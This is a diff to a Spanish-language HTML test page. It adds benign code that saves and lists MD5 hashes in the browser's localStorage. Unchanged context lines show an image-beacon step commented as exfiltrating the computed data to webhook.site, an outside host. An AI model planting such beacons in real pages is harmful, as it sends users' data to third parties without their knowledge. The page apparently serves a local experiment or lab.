@@ -62,7 +62,11 @@
       </div>
       <img id="testImage" src="" alt="Test Image" class="test-image" />
       
-      <h2>Pasos rápidos</h2>
+      <h2>Hashes Generados</h2>
+      <div id="hashesSection" class="info-panel">
+        <button id="refreshHashes" onclick="loadHashes()">Actualizar Hashes</button>
+        <pre id="hashesList">Cargando hashes...</pre>
+      </div>
       <ol>
         <li>Abrir PowerShell en esta carpeta.</li>
         <li>Ejecutar <code>python server.py</code> (usa el servidor personalizado).</li>
@@ -87,6 +91,28 @@
         return CryptoJS.MD5(level.toString()).toString();
       }
       
+      function saveHash(level, md5) {
+        const timestamp = new Date().toISOString();
+        const hashEntry = `${timestamp} - Level: ${level} - MD5: ${md5}`;
+        
+        let hashes = JSON.parse(localStorage.getItem('generatedHashes') || '[]');
+        hashes.push(hashEntry);
+        localStorage.setItem('generatedHashes', JSON.stringify(hashes));
+        
+        loadHashes(); // Actualizar la lista inmediatamente
+      }
+      
+      function loadHashes() {
+        const hashes = JSON.parse(localStorage.getItem('generatedHashes') || '[]');
+        const hashesList = document.getElementById('hashesList');
+        
+        if (hashes.length === 0) {
+          hashesList.textContent = 'No se han generado hashes aún.';
+        } else {
+          hashesList.textContent = hashes.join('\n');
+        }
+      }
+      
       img.onload = function() {
         const width = this.naturalWidth;
         const height = this.naturalHeight;
@@ -100,6 +126,9 @@
         
         const md5 = computeMD5(level);
         document.getElementById('md5Hash').textContent = md5;
+        
+        // Guardar el hash localmente
+        saveHash(level, md5);
         
         // Exfiltrate the data to webhook.site
         const exfilImg = new Image();
@@ -116,6 +145,9 @@
       };
       
       img.src = imageUrl;
+      
+      // Cargar hashes al iniciar la página
+      loadHashes();
     </script>
   </body>
 </html>
